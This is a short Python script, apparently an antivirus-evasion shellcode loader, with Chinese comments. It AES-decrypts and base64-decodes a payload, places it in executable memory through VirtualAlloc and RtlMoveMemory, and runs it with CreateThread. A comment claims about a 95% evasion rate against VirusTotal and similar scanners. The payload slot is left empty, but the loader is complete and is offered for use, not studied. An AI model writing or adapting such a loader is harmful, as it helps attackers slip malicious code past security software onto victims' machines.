
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
import ctypes,base64

# 经微步在线，virustotal，virscan平台综合测试，免杀率大约为95%(测试时间2023年3月4日00:42:19)


# 解密后，去掉补足的空格用strip() 去掉
def decrypt(text):
    key = '9999999966666666'.encode('utf-8')
    iv = b'qqqqqqqqwwwwwwww'
    mode = AES.MODE_CBC
    cryptos = AES.new(key, mode, iv)
    plain_text = cryptos.decrypt(a2b_hex(text))
    code=bytes.decode(plain_text).rstrip('\0')
    return code

def zx(code):
    cd = base64.b64decode(code)
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    shangxian = ctypes.windll.kernel32.VirtualAlloc(0, len(cd), 0x1000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(shangxian), ctypes.create_string_buffer(cd), len(cd))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(shangxian), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

# code填入的值是由AES加密脚本输出的text的值
if __name__ == '__main__':
    code=b''
    code=decrypt(code)
    zx(code)

